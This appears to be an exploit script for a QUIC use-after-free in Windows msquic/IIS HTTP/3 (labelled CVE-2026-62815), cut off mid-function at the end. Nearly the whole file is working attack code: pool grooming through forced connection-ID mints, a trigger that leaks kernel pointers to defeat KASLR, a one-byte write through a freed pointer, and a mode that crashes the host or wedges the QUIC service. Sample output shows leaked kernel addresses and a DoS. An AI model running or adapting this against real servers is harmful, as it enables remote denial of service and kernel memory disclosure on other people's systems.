#!/usr/bin/env python3
# ==============================================================
#   CVE-2026-62815: QUIC UaF
#   Tested on IIS with http/3 on Windows 2025, 2022
#   @w3bd3vil  
#   https://krashconsulting.com
#   ** MAY RESULT IN A KRASH **
# ==============================================================

"""
One engine, one transport bug.  msquic's path-promotion UAF leaves a freed
QUIC_CID ('Qc0E', 0x60 chunk) as a live Path->DestCid.  The send path then does
    len  = DestCid[+0x21];  DCID = DestCid[+0x30 .. +0x30+len)
on EVERY outgoing packet.  Reclaim the freed block with a same-bucket object and
that object's +0x21 byte (byte 1 of a pointer, usually) becomes an over-long
Length -> the DCID window reads past the object into adjacent pool.

    phase g  groom with server SourceCid mints ('Qc0D', also a 0x60 chunk).  A
             Qc0D holds QUIC_CONNECTION* at +0x20, so byte1(CONN*) = over-long
             Length and the window leaks the neighbour chunks: other
             connections' CIDs, live QUIC_CONNECTION*/hash-bucket addresses, and
             (neighbour == 'Icp ') an ntoskrnl.exe .text pointer -> KASLR break.
    phase h  same groom, then drives QuicConnRetireCurrentDestCid -> OR 0x22
             through the stale pointer.  Sustained churn also drains the freed
             block's pool page; the next +0x21 read faults -> bugcheck 0x50
             (crash).

Defaults are the measured winners on my lab, my vary for you!

Requirements:
pip install aioquic

Usage:

Test if vulnerable:
    python3 cve_2026_62815_leak.py -t domain.com --check

Test if there is an actual pointer leak only, without the crash probe:
    python3 cve_2026_62815_leak.py -t domain.com --leak

Crash the host:
    python3 cve_2026_62815_leak.py -t domain.com

Output:
└─$ python3 cve_2026_62815_leak.py -t google.com --check
Unsupported target, abort!

└─$ python3 cve_2026_62815_leak.py -t domain.com --check -debug
[snip]
[i3]    [part] target partition 0 of 4: 12/21 dials kept (57%)
[i0]    [part] target partition 2 of 4: 12/34 dials kept (35%)
[i1]    kill sent on sport 43182: NCID(seq=6, rpt=6, cid=12a95fc12c4d3fde78ed1561d37fed11afe757f9) + PING
[i1]    !! RETIRED CID REUSED by server: seq5 7855612c5a90e4beead70f09c4ef7b82bc12c56f (x3 pkts)
[i1]    !! RETIRED CID REUSED by server: seq2 7e7cff629c91b5f490b33122eb6d3b0400e20325 (x3 pkts)
[i2]    kill sent on sport 33184: NCID(seq=5, rpt=5, cid=0e83ef040cf64858463194e1f01ad66996aade4a) + PING
[snip]
[i1] === VULNERABLE: RETIRED-CID-REUSE observed ===

└─$ python3 cve_2026_62815_leak.py -t 10.10.11.44 -sni WIN-P81HK174QRP -debug
[snip]
[i3]    *** G-LEAK seq=2 dgram_len=252 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_p08=0xffffd50c42b75110 adj2_p08=0xffffd50c42b75170] tags=[adj_tag='IoDi' adj2_tag='IoDi'] adj_len=0 adj_cid=6100630065002e00700068007000000000000000
[i3]    *** G-LEAK seq=2 dgram_len=251 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_p08=0xffffd50c42b75110 adj2_p08=0xffffd50c42b75170] tags=[adj_tag='IoDi' adj2_tag='IoDi'] adj_len=0 adj_cid=6100630065002e00700068007000000000000000
[i3]    *** G-LEAK seq=2 dgram_len=252 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_next=0xffffdd034dbfa610 adj_p08=0xffffd50c3f5cfb60 adj_link=0xffffd50c42b75298 adj_conn=0xffffd50c3ee49020 adj2_p08=0xffffd50c42b75170~] tags=[adj_tag='Qc0D'<<< adj2_tag='IoDi'] adj_len=9 adj_cid=r3-g1-9-peercid-seq1
[i3]    *** G-LEAK seq=2 dgram_len=252 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_next=0xffffdd034dbfa610 adj_p08=0xffffd50c3f5cfb60 adj_link=0xffffd50c42b75298 adj_conn=0xffffd50c3ee49020 adj2_p08=0xffffd50c42b75170~] tags=[adj_tag='Qc0D'<<< adj2_tag='IoSB'] adj_len=9 adj_cid=r3-g1-9-peercid-seq1
[i3]    *** G-LEAK seq=2 dgram_len=254 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_next=0xffffdd034dbfa610 adj_p08=0xffffd50c3f5cfb60 adj_link=0xffffd50c42b75298 adj_conn=0xffffd50c3ee49020 adj2_p08=0xffffd50c42b75170~] tags=[adj_tag='Qc0D'<<< adj2_tag='IoSB'] adj_len=9 adj_cid=r3-g1-9-peercid-seq1
[i3]    *** G-LEAK seq=2 dgram_len=251 own_cid=060b510cc329b156b6c70ce10000000000000000 kptrs=[adj_next=0xffffdd034dbfa610 adj_p08=0xffffd50c3f5cfb60 adj_link=0xffffd50c42b75298 adj_conn=0xffffd50c3ee49020 adj2_p08=0xffffd50c42b75170~] tags=[adj_tag='Qc0D'<<< adj2_tag='IoSB'] adj_len=9 adj_cid=r3-g1-9-peercid-seq1
[i3]    === 6 unique SourceCid-reclaim leaks ===
[snip]
[i1] --- round 19/48 ---
[i0]    poison handshake failed
[i0]    handshake FAILED (target down? streak=1)
[i2]    poison handshake failed
[i2]    handshake FAILED (target down? streak=3)
[i2]
[i2] *** TARGET UP but QUIC listener wedged (service DoS) ***
[i2] === VULNERABLE: G-LEAK observed ===
[i0] --- round 20/48 ---
[i0]    handshake ok; server peer CIDs: [(0, None), ('current', '8234be2d28caf531ab')]
[i3]    poison handshake failed
[i3]    handshake FAILED (target down? streak=1)
[snip]
"""

import argparse
import json
import os
import socket
import ssl
import struct
import sys
import time
import subprocess
import threading

from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection, QuicConnectionId
from aioquic.quic.packet import QuicFrameType
from aioquic.quic import events as qevents

# --- command line -----------------------------------------------------------
_p = argparse.ArgumentParser(
    prog='cve_2026_62815_leak.py',
    description='CVE-2026-62815 remote kernel info-leak + write/crash probe. @w3bd3vil')
_p.add_argument('-t', '--target', required=True,
                help='target host (IP or hostname)')
_p.add_argument('-p', '--port', type=int, default=443,
                help='UDP port (default 443)')
_p.add_argument('-sni', '--sni', default=None,
                help='TLS SNI value (default: same as --target)')
_p.add_argument('-c', '--check', action='store_true',
                help='quick check: stop on first RETIRED-CID-REUSE, 1 round x 4 instances')
_p.add_argument('-leak', '--leak', action='store_true',
                help='stop on the first G-LEAK instead of running all 48 rounds')
_p.add_argument('-debug', '--debug', action='store_true',
                help='verbose output (print everything)')
_args = _p.parse_args()

HOST  = _args.target
PORT  = _args.port
SNI   = _args.sni or _args.target     # IP-literal SNI is rejected; pass -sni for IP targets
CHECK = _args.check
LEAK  = _args.leak
DEBUG = _args.debug

# Single mode: phase h always runs (groom -> leak -> OR-write/crash probe).
PHASE  = 'h'
ROUNDS = 1 if CHECK else 48

# ALPN stays env-overridable so the same engine can drive SMB-over-QUIC.
ALPN = os.environ.get('ALPN', 'h3')               # 'smb' for SMB-over-QUIC (udp/443)


def dbg(msg):
    """Verbose logging: printed only with -debug (otherwise only G-LEAKs etc.)."""
    if DEBUG:
        print(msg, flush=True)

# --- tuned defaults (measured winners) --------------------------------------
PCIDLEN      = 20          # poisoned CID len -> 0x50 body -> 0x60 chunk (the bucket)
NHELPERS     = 12          # helpers per groom wave
GWAVES       = 4           # groom waves
WHELPERS     = NHELPERS
WAVE_GAP     = 2.0
COLLECT_SECS = 8.0
PARTITIONS   = 4           # 
PARTITION_MASK = PARTITIONS - 1
PARTITION_DIAL_CAP = max(24, 3 * PARTITIONS * 12)
HS_TIMEOUT   = 4.0         # per-dial handshake budget
DIAL_PACE    = 0.0
IOLOAD       = 0           # extra conns flooding PINGs -> 'Icp ' neighbours (KASLR ptr).
IOLOAD_PINGS = 8
MILK_INTERVAL = 0.05       # re-read the stale DestCid ~20x/s during collect
FENGSHUI     = 0           # retire->mint cycles per helper right after the kill.
                           # 0 (proven 30%/round): a positive value mints hundreds of
                           # Qc0D/round and drains the freed block's page -> early DoS
                           # before a leak.  Re-enable only if the leak rate drops.
INSTANCES    = int(os.environ.get('INSTANCES', 4))   # parallel processes (leak+crash knob)
INSTANCE_GAP = 1.0

RETIRE_PRIOR_TO = 0

# Packets the server must send on a CID we explicitly retired before we call it
# RETIRED-CID-REUSE.  One or two packets right after the kill are the benign
# in-flight drain race every conforming QUIC stack (e.g. Cloudflare) shows; the
# msquic UAF keeps transmitting on the retired CID, so this filters that noise.
RETIRE_REUSE_MIN = 3

# --- aioquic patches (same as the v2 trigger) -------------------------------
from aioquic.quic.connection import NEW_CONNECTION_ID_FRAME_CAPACITY
def _w_ncid(self, builder, connection_id):
    buf = builder.start_frame(QuicFrameType.NEW_CONNECTION_ID,
                              NEW_CONNECTION_ID_FRAME_CAPACITY,
                              self._on_new_connection_id_delivery, (connection_id,))
    buf.push_uint_var(connection_id.sequence_number)
    buf.push_uint_var(RETIRE_PRIOR_TO)
    buf.push_uint8(len(connection_id.cid))
    buf.push_bytes(connection_id.cid)
    buf.push_bytes(connection_id.stateless_reset_token)
    connection_id.was_sent = True
QuicConnection._write_new_connection_id_frame = _w_ncid

_rc = QuicConnection._handle_retire_connection_id_frame
def _rc_safe(self, context, frame_type, buf):
    try:
        return _rc(self, context, frame_type, buf)
    except Exception:
        return None
QuicConnection._handle_retire_connection_id_frame = _rc_safe

_nc = QuicConnection._handle_new_connection_id_frame
def _nc_safe(self, context, frame_type, buf):
    try:
        return _nc(self, context, frame_type, buf)
    except Exception:
        return None
QuicConnection._handle_new_connection_id_frame = _nc_safe


def host_alive(timeout=3.0):
    """Is the box reachable at all (any TCP service answers)?

    TCP reachability separates a full bugcheck/reboot (everything unreachable)
    from a QUIC-listener wedge (box up, TCP up, but msquic/http.sys stopped
    completing handshakes).
    """
    for p in (PORT, 445, 22):
        try:
            s = socket.create_connection((HOST, p), timeout=timeout)
            s.close()
            return True
        except Exception:
            continue
    return False


def scan_ptrs(buf):
    """list of (offset, qword) that look like kernel pointers"""
    out = []
    for off in range(0, len(buf) - 7):
        (q,) = struct.unpack_from('<Q', buf, off)
        if 0xFFFF800000000000 <= q <= 0xFFFFFFFFFFFFFFFF and (q & 0xFFF) != 0:
            out.append((off, q))
    return out


def is_kptr(q):
    return 0xFFFF800000000000 <= q <= 0xFFFFFFFFFFFFFFFF and (q & 0xFFF) != 0


# Candidate pointer fields in the adjacent object, as window offsets.
ADJ_PTRS = (('adj_next', 0x30), ('adj_p08', 0x38), ('adj_p10', 0x40),
            ('adj_link', 0x48), ('adj_conn', 0x50), ('adj_p40', 0x70),
            ('adj_p48', 0x78))
ADJ2_PTRS = (('adj2_next', 0x90), ('adj2_p08', 0x98), ('adj2_p18', 0xA8),
             ('adj2_conn', 0xB0))
ALL_PTRS = ADJ_PTRS + ADJ2_PTRS

# POOL_HEADER tag (chunk+0x04) of the adjacent/third chunks, as window offsets.
TAG_OFFSETS = (('adj_tag', 0x24), ('adj2_tag', 0x84))

# msquic CID pool tags: 'Qc0D' = SourceCid mint, 'Qc0E' = DestCid.
QUIC_CID_TAGS = ('Qc0D', 'Qc0E')

# Every printable-ASCII 'Q...' pool/lookaside tag used by msquic (july.sys/aug.sys).
MSQUIC_POOL_TAGS = frozenset((
    'QUIC',
    'Qc00', 'Qc01', 'Qc02', 'Qc03', 'Qc04', 'Qc05', 'Qc06',
    'Qc0A', 'Qc0B', 'Qc0C', 'Qc0D', 'Qc0E',
    'Qc10', 'Qc11', 'Qc12', 'Qc13', 'Qc14', 'Qc15', 'Qc16', 'Qc17', 'Qc18',
    'Qc19', 'Qc1A', 'Qc1B', 'Qc1C', 'Qc1D', 'Qc1E', 'Qc1F',
    'Qc21', 'Qc22', 'Qc24', 'Qc27', 'Qc28', 'Qc2B', 'Qc2C', 'Qc2D', 'Qc2E',
    'Qc2F',
    'Qc30', 'Qc31', 'Qc32', 'Qc33', 'Qc34', 'Qc35', 'Qc36', 'Qc37', 'Qc38',
    'Qc39', 'Qc3A', 'Qc3B', 'Qc3C', 'Qc3D',
    'Qc40', 'Qc41', 'Qc42', 'Qc43', 'Qc44', 'Qc46', 'Qc4C', 'Qc4D',
))

# A reclaimed block balloons the datagram past this length (byte1(CONN*) > ~20).
RECLAIM_LEN_HINT = 90

def classify_g_leak(d, own_labels, adj_labels):
    """Phase g: is this short-header datagram a SourceCid-reclaim leak?

    The freed 0x60 DestCid block is reclaimed by a server SourceCid mint
    (QUIC_CID_HASH_ENTRY): CONN* at +0x20, flags +0x28, Length +0x29, seq +0x30,
    CID data +0x38.  Read as a DestCid the fake Length = byte 1 of the CONN
    pointer; the DCID window (starts at block+0x30) becomes:
      [0:8]    seq, [8:28] SourceCid CID data, then the next 0x60 pool chunks
    (each: 0x10 POOL_HEADER + 0x50 body).  Only the first Length bytes are pool
    memory; past that is ciphertext.  Returns a candidate rec dict or None.
    """
    if len(d) < 1 + 0x21 or d[0] & 0x80:
        return None
    (seq,) = struct.unpack_from('<Q', d, 1)
    if seq > 500:
        return None
    own = d[9:29]
    if sum(1 for b in own if b) < 8:
        return None
    rec = {'seq': seq, 'own_cid_hex': own.hex(), 'dgram_len': len(d),
           'dump': d[:320].hex()}
    m = own_labels.get(own) or own_labels.get(own[:9])
    if m:
        rec['own_cid_match'] = m
    if len(d) >= 1 + 0x68:
        for key, off in ADJ_PTRS:
            (q,) = struct.unpack_from('<Q', d, 1 + off)
            if is_kptr(q):
                rec[key] = hex(q)
        rec['adj_flags'] = d[1 + 0x58]
        rec['adj_len'] = d[1 + 0x59]
        (seq2,) = struct.unpack_from('<Q', d, 1 + 0x60)
        rec['adj_seq'] = seq2
        if len(d) >= 1 + 0x7C:
            ac = d[1 + 0x68:1 + 0x7C]
            rec['adj_cid_hex'] = ac.hex()
            m2 = adj_labels.get(ac) or adj_labels.get(ac[:9])
            if m2:
                rec['adj_cid_match'] = m2
    for key, off in TAG_OFFSETS:
        if len(d) >= 1 + off + 4:
            t = bytes(c & 0x7F for c in d[1 + off:1 + off + 4])
            if all(0x20 <= c < 0x7F for c in t):
                rec[key] = t.decode('ascii')
    for key, off in ADJ2_PTRS:
        if len(d) >= 1 + off + 8:
            (q,) = struct.unpack_from('<Q', d, 1 + off)
            if is_kptr(q):
                rec[key] = hex(q)
    rec['dcid_len_max'] = dl_max = len(d) - 19
    if rec.get('adj_conn'):
        dl = int(rec['adj_conn'], 16).to_bytes(8, 'little')[1]
        rec['dcid_len_inferred'] = dl
        if dl > dl_max:
            rec['len_inconsistent'] = True
        hint = [k for k, off in ALL_PTRS if rec.get(k) and off + 8 > dl]
        hint += [k for k, off in TAG_OFFSETS if rec.get(k) and off + 4 > dl]
        if hint:
            rec['infer_hint_beyond'] = hint
        pv = [rec[k] for k, _ in ALL_PTRS if rec.get(k)]
        strong = [k for k, off in ALL_PTRS
                  if rec.get(k) and off + 8 > dl and pv.count(rec[k]) > 1]
        strong += [k for k, off in TAG_OFFSETS
                   if rec.get(k) in MSQUIC_POOL_TAGS and off + 4 > dl]
        if strong:
            rec['infer_contradicted'] = True
            rec['infer_contradicted_by'] = strong
    beyond = [k for k, off in ALL_PTRS if rec.get(k) and off + 8 > dl_max]
    beyond += [k for k, off in TAG_OFFSETS if rec.get(k) and off + 4 > dl_max]
    if beyond:
        rec['beyond_dcid'] = beyond
    wp = [[hex(o), hex(q)] for o, q in scan_ptrs(d[1:])]
    if wp:
        rec['win_ptrs'] = wp[:12]
    return rec


def parse_first_packet(d, cidlen=8):
    """-> (kind, dcid, rest_of_datagram_after_header_byte)"""
    if not d:
        return None, b'', b''
    b0 = d[0]
    if b0 & 0x80:  # long header
        if len(d) < 7:
            return 'long?', b'', d[1:]
        (ver,) = struct.unpack_from('>I', d, 1)
        if ver == 0:
            return 'vneg', b'', d[1:]
        dl = d[5]
        dcid = d[6:6 + dl]
        return 'long', dcid, d[6 + dl:]
    return 'short', d[1:1 + cidlen], d[1:]

class Endpoint:
    """one QuicConnection + its UDP socket(s); captures raw datagrams."""
    _next_id = 0

    def __init__(self, cid_len=8, marker_scid=None, label=''):
        cfg = QuicConfiguration(is_client=True, alpn_protocols=[ALPN],
                                verify_mode=ssl.CERT_NONE, idle_timeout=60.0,
                                connection_id_length=cid_len)
        cfg.server_name = SNI
        self.c = QuicConnection(configuration=cfg)
        if marker_scid is not None:
            self.c._host_cids[0].cid = marker_scid
            self.c.host_cid = marker_scid
            self.c._local_initial_source_connection_id = marker_scid
        self.t0 = time.time()
        self.socks = []
        self.cap = []                    # (ts, sport, bytes)
        self.label = label or f'ep{Endpoint._next_id}'
        self.marker_scid = marker_scid
        self.dead = False
        Endpoint._next_id += 1

    def now(self):
        return time.time() - self.t0

    def sock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.35)
        s.bind(('0.0.0.0', 0))
        self.socks.append(s)
        return s

    def flush(self, sk):
        for d, a in self.c.datagrams_to_send(now=self.now()):
            try:
                sk.sendto(d, a)
            except Exception:
                pass

    def pump(self, sk, secs, capture=True):
        end = time.time() + secs
        while time.time() < end:
            self.flush(sk)
            try:
                d, src = sk.recvfrom(4096)
                if capture:
                    self.cap.append((time.time() - self.t0, sk.getsockname()[1], d))
                try:
                    self.c.receive_datagram(d, src, now=self.now())
                except Exception:
                    pass
            except socket.timeout:
                pass
            except Exception:
                self.dead = True
                return False
            ev = self.c.next_event()
            while ev is not None:
                if isinstance(ev, qevents.ConnectionTerminated):
                    self.dead = True
                    return False
                ev = self.c.next_event()
        self.flush(sk)
        return True

    def handshake(self, timeout=4.0):
        s = self.sock()
        if not getattr(self, '_connected', False):
            self.c.connect((HOST, PORT), now=self.now())
            self._connected = True
        # Early-exit as soon as the handshake completes instead of pumping the
        # full budget.  Steering/ioload dial many helpers; a fixed 4s pump per
        # dial (~48 dials) would turn each round into minutes.
        end = time.time() + timeout
        while time.time() < end:
            self.flush(s)
            try:
                d, src = s.recvfrom(4096)
                self.cap.append((time.time() - self.t0, s.getsockname()[1], d))
                try:
                    self.c.receive_datagram(d, src, now=self.now())
                except Exception:
                    pass
            except socket.timeout:
                pass
            except Exception:
                self.dead = True
                return False
            ev = self.c.next_event()
            while ev is not None:
                if isinstance(ev, qevents.ConnectionTerminated):
                    self.dead = True
                    return False
                ev = self.c.next_event()
            if self.c._handshake_complete:
                break
        self.flush(s)
        return self.c._handshake_complete

    def ping(self, n=1):
        for _ in range(n):
            try:
                self.c.send_ping(0x1000 + _)
            except Exception:
                pass

    def close(self, graceful=False):
        if graceful and not self.dead and self.socks:
            try:
                self.c.close()
                self.flush(self.socks[0])
            except Exception:
                pass
        for s in self.socks:
            try:
                s.close()
            except Exception:
                pass

    def host_cid_table(self):
        return {c.cid: f'{self.label}-hostcid-seq{c.sequence_number}'
                for c in self.c._host_cids}

    def partition_id(self):
        """msquic partition this connection is bound to, read off the wire.

        QuicCidNewRandomSource builds every server SourceCid as
            [prefix (0 by default)][16-bit partition, LE][7 random]
        the 9-byte server CID we see everywhere.  Only the low log2(PARTITIONS)
        bits carry the index.  The pool free list is per-CPU, so a helper can
        only reclaim the poisoned connection's freed Qc0D from the SAME
        partition.
        """
        cid = getattr(self.c, '_peer_cid', None)
        if cid is None or len(cid.cid) < 2:
            return None
        return struct.unpack_from('<H', cid.cid, 0)[0] & PARTITION_MASK

    def peer_cids(self):
        seqs = sorted(getattr(self.c, '_peer_cid_sequence_numbers', {0: None}))
        cur = getattr(self.c, '_peer_cid', None)
        out = [(s, None) for s in seqs]
        if cur is not None:
            out.append(('current', cur.cid.hex()))
        return out

    def peer_cid_table(self):
        out = {}
        cur = getattr(self.c, '_peer_cid', None)
        if cur is not None and getattr(cur, 'cid', None):
            out[cur.cid] = f'{self.label}-peercid-current'
        for c in getattr(self.c, '_peer_cid_available', []):
            cid = getattr(c, 'cid', None)
            if cid:
                out[cid] = f'{self.label}-peercid-seq{c.sequence_number}'
        return out

def make_paths(ep, n=3):
    """migrate across n extra source ports -> n+1 server-side paths."""
    paths = [ep.socks[0]]
    for i in range(n):
        s = ep.sock()
        ep.c.send_ping(0x200 + i)
        if not ep.pump(s, 1.5):
            return None
        paths.append(s)
    return paths


def mint_burst(eps, cycles):
    """Force the server to mint a tight burst of Qc0D SourceCids on the partition
    of the given (co-partition) endpoints, to pack the freed block's neighbours.
    Each retire of a server SourceCid triggers a replacement mint
    (QuicConnGenerateNewSourceCid -> QuicCidNewRandomSource -> 0x60 'Qc0D')."""
    minted = 0
    for _ in range(cycles):
        for ep in eps:
            if ep.dead:
                continue
            seqs = [c.sequence_number for c in getattr(ep.c, '_peer_cid_available', [])
                    if c.sequence_number is not None]
            if not seqs:
                continue
            ep.c._retire_connection_ids.extend(seqs)
            minted += len(seqs)
            ep.ping()
            for sk in ep.socks:
                ep.flush(sk)
        for ep in eps:
            for sk in ep.socks:
                ep.pump(sk, 0.08)
    return minted


def kill_once(ep, victim, retire_floor=None):
    """one kill round: NCID(seq=N, rpt=N) + PING on an established non-active path.
    retire_floor lets the caller retire only BELOW a chosen sequence number
    instead of everything (phase h spares)."""
    global RETIRE_PRIOR_TO
    for cid in ep.c._host_cids:
        cid.was_sent = True
    seq = ep.c._host_cid_seq
    newcid = os.urandom(len(ep.c._host_cids[0].cid))
    ep.c._host_cids.append(QuicConnectionId(
        cid=newcid, sequence_number=seq,
        stateless_reset_token=os.urandom(16), was_sent=False))
    ep.c._host_cid_seq += 1
    RETIRE_PRIOR_TO = seq if retire_floor is None else retire_floor
    ep.c.send_ping(0x900)
    ep.pump(victim, 1.5)
    RETIRE_PRIOR_TO = 0
    return seq, newcid


def collect(eps, secs, on_poison_datagram, sync=None, wave=None, stop_when=None):
    """round-robin pump of all endpoints; callback for datagrams on poisoned conn.
    wave(eps) may append new endpoints; stop_when() early-exits when truthy."""
    t_end = time.time() + secs
    last_ping = 0.0
    last_milk = 0.0
    poison = eps[0]
    while time.time() < t_end:
        if stop_when and stop_when():
            break
        if wave:
            wave(eps)
        if sync:
            sync()
        for ep in eps:
            if ep.dead:
                continue
            for sk in ep.socks:
                ep.flush(sk)
                sk.setblocking(False)
                try:
                    while True:
                        d, src = sk.recvfrom(4096)
                        ts = time.time() - ep.t0
                        ep.cap.append((ts, sk.getsockname()[1], d))
                        if ep is poison:
                            on_poison_datagram(ts, sk.getsockname()[1], d)
                        try:
                            ep.c.receive_datagram(d, src, now=ep.now())
                        except Exception:
                            pass
                except (BlockingIOError, socket.timeout):
                    pass
                except Exception:
                    ep.dead = True
                sk.settimeout(0.35)
                ev = ep.c.next_event()
                while ev is not None:
                    if isinstance(ev, qevents.ConnectionTerminated):
                        ep.dead = True
                    ev = ep.c.next_event()
        if time.time() - last_ping > 0.3:
            for ep in eps:
                if not ep.dead:
                    ep.ping()
            last_ping = time.time()
        # Milk the poison faster than the 0.3s groom cadence: each ping draws a
        # server ACK that re-reads the stale DestCid, sampling the reclaimed
        # neighbourhood more often and keeping the poison's state alive.
        if MILK_INTERVAL and not poison.dead and time.time() - last_milk > MILK_INTERVAL:
            poison.ping()
            for sk in poison.socks:
                poison.flush(sk)
            last_milk = time.time()
        time.sleep(0.004)

def fire_retire_trigger(poison, rid, log):
    """Drive QuicConnRetireCurrentDestCid on the stale path RIGHT NOW.

    Deliver the spare as a PURE SPARE (retire_prior_to stays 0).  With rpt=s the
    wave retires the active path's in-use DestCid, QuicConnReplaceRetiredCids
    runs and immediately spends the brand-new spare (Flags |= 0x08), leaving
    nothing for the stale path.  With rpt=0 the spare survives with Flags=0x40
    (0x40 & 0x28 == 0), so QuicConnGetUnusedDestCid returns it and the OR gate is
    reachable.  Also rotates the peer CID so the next ping is the FIRST use of a
    server SourceCid (the dispatch gate needs an already-used path + first-use
    DCID before it calls QuicConnRetireCurrentDestCid).
    """
    global RETIRE_PRIOR_TO
    for c in poison.c._host_cids:
        c.was_sent = True
    s = poison.c._host_cid_seq
    poison.c._host_cids.append(QuicConnectionId(
        cid=os.urandom(PCIDLEN), sequence_number=s,
        stateless_reset_token=os.urandom(16), was_sent=False))
    poison.c._host_cid_seq += 1
    RETIRE_PRIOR_TO = 0

    avail = len(getattr(poison.c, '_peer_cid_available', ()) or ())
    rotated = False
    peer_seq = None
    if avail:
        poison.c._consume_peer_cid()
        rotated = True
        peer_seq = poison.c._peer_cid.sequence_number
        dbg(f'   peer-CID rotated -> seq{peer_seq} '
            f'({avail - 1} spare peer CIDs left)')
    else:
        dbg('   peer-CID rotation SKIPPED: no unused server CID available')

    # Stage 0.2: log the rotation outcome per round.  esc_track_ab.md could not
    # tell whether the peer-CID rotation (its "change 2") ever actually fired,
    # because this path only printed to stdout.  JSONL it so the OR-on-reclaim
    # can be attributed to RETIRE_PRIOR_TO=0 vs the rotation precondition.
    log.write(json.dumps({'round': rid, 'class': 'ROTATE', 'rotated': rotated,
                          'peer_seq': peer_seq,
                          'spare_left': (avail - 1) if rotated else 0,
                          'ncid_seq': s}) + '\n')
    log.flush()

    poison.ping(4)
    for sk in poison.socks:
        poison.flush(sk)
    RETIRE_PRIOR_TO = 0
    return s


def write_probe(poison, rid, log, reclaimed):
    """Phase h: after the kill, drive the code path that WRITES through the
    stale Path->DestCid, and report liveness after each step.

    QuicConnRetireCurrentDestCid loads Path->DestCid (Path+0x90), gates on
    DestCid->Length != 0 (+0x21), then calls QuicConnRetireCid which does
    *(BYTE*)(DestCid+0x20) |= 0x22 -- a one-byte OR into the freed (by now
    reclaimed) block.  Needs QuicConnGetUnusedDestCid to succeed, so spare CIDs
    are advertised first.  Reports host liveness after each step so a bugcheck
    can be attributed to a specific action.
    """
    steps = []
    dbg(f'   [h] reclaim confirmed this round: {reclaimed}'
        + ('' if reclaimed else '   <-- null result is UNINFORMATIVE'))

    def mark(name):
        alive = host_alive()
        steps.append((name, alive))
        dbg(f'   [h] after {name:26s} host_alive={alive} '
            f'reclaimed={reclaimed}')
        log.write(json.dumps({'round': rid, 'class': 'H-STEP', 'step': name,
                              'alive': alive, 'reclaimed': reclaimed}) + '\n')
        log.flush()
        return alive

    if not mark('kill+groom'):
        return steps
    # 1. spare unused DestCids, else QuicConnGetUnusedDestCid fails
    for _ in range(4):
        for c in poison.c._host_cids:
            c.was_sent = True
        s = poison.c._host_cid_seq
        poison.c._host_cids.append(QuicConnectionId(
            cid=os.urandom(PCIDLEN), sequence_number=s,
            stateless_reset_token=os.urandom(16), was_sent=False))
        poison.c._host_cid_seq += 1
    poison.ping(2)
    collect([poison], 1.5, lambda *a: None)
    if not mark('fresh NCIDs advertised'):
        return steps
    # 2. post-kill migrations -> QuicConnRecvPostProcessing / QuicSendFlush run
    for i in range(6):
        try:
            sk = poison.sock()
            poison.c.send_ping(0x300 + i)
            poison.pump(sk, 1.0)
        except Exception:
            break
        if poison.dead:
            break
    if not mark('6 post-kill migrations'):
        return steps
    # 3. a SECOND retire wave on top of the first
    if poison.socks and not poison.dead:
        kill_once(poison, poison.socks[-1])
        collect([poison], 2.0, lambda *a: None)
    if not mark('second retire wave'):
        return steps
    # 4. teardown (control, not an expected double free)
    poison.close(graceful=True)
    time.sleep(1.0)
    mark('graceful teardown')
    return steps

def run_round(rid, log, gknown):
    poison = Endpoint(cid_len=PCIDLEN, label=f'r{rid}-poison')
    if not poison.handshake():
        dbg('   poison handshake failed')
        return None
    dbg(f'   handshake ok; server peer CIDs: {poison.peer_cids()}')
    paths = make_paths(poison)
    if not paths:
        dbg('   migration failed')
        poison.close()
        return []

    cid_seq = {c.cid: c.sequence_number for c in poison.c._host_cids}
    known = poison.host_cid_table()

    # pre-kill baseline: foreign DCIDs *before* the kill are zombie traffic from
    # previous rounds/connections (port reuse), not signal.
    collect([poison], 0.8, lambda ts, sp, d: None)
    zombie = set()
    for ts, sport, d in poison.cap:
        kind, dcid, _ = parse_first_packet(d, PCIDLEN)
        if kind == 'short' and dcid not in known and dcid not in gknown:
            zombie.add(dcid)

    # --- partition steering: pre-dial helpers on the poison's partition -------
    # MUST happen before the kill: every discarded helper's teardown returns
    # 0x60 blocks into the bucket, and doing that after the free buries it.
    steered = []
    if PARTITIONS > 1:
        target = poison.partition_id()
        dials = 0
        if target is None:
            dbg('   [part] poisoned partition UNKNOWN -- steering skipped')
        else:
            while len(steered) < WHELPERS and dials < PARTITION_DIAL_CAP:
                h = Endpoint(cid_len=8, label=f'r{rid}-gS-{len(steered)}')
                dials += 1
                try:
                    ok = h.handshake(timeout=HS_TIMEOUT)
                except Exception:
                    ok = False
                    h.dead = True
                if ok and h.c._handshake_complete and h.partition_id() == target:
                    steered.append(h)
                else:
                    h.close()
                for s in steered:
                    if not s.dead:
                        s.ping()
                        for sk in s.socks:
                            s.flush(sk)
                if DIAL_PACE:
                    time.sleep(DIAL_PACE)
            keep = (100.0 * len(steered) / dials) if dials else 0.0
            dbg(f'   [part] target partition {target} of {PARTITIONS}: '
                f'{len(steered)}/{dials} dials kept ({keep:.0f}%)')

    # --- I/O-load: PING-flood conns -> 'Icp ' completion allocations ---------
    ioload = []
    if IOLOAD > 0:
        for i in range(IOLOAD):
            h = Endpoint(cid_len=8, label=f'r{rid}-io-{i}')
            if h.handshake(timeout=HS_TIMEOUT) and h.c._handshake_complete:
                ioload.append(h)
            else:
                h.close()
        dbg(f'   [io] {len(ioload)}/{IOLOAD} I/O-load conns up')

    victim = paths[1]
    # stop aioquic from topping up host CIDs after the kill: the top-up DestCid
    # would LIFO-reclaim the freed block and hide the leak.
    poison.c._remote_active_connection_id_limit = 0

    seq, killcid = kill_once(poison, victim)
    known[killcid] = f'r{rid}-killncid-seq{seq}'
    cid_seq[killcid] = seq
    dbg(f'   kill sent on sport {victim.getsockname()[1]}: '
        f'NCID(seq={seq}, rpt={seq}, cid={killcid.hex()}) + PING')

    # feng-shui: pack fresh Qc0D onto the poison's partition right after the
    # kill, so the freed block's neighbours are SourceCids (CONN* -> over-long
    # Length) rather than the server's workload.
    if FENGSHUI > 0:
        pool = [h for h in steered if not h.dead]
        if pool:
            n = mint_burst(pool, FENGSHUI)
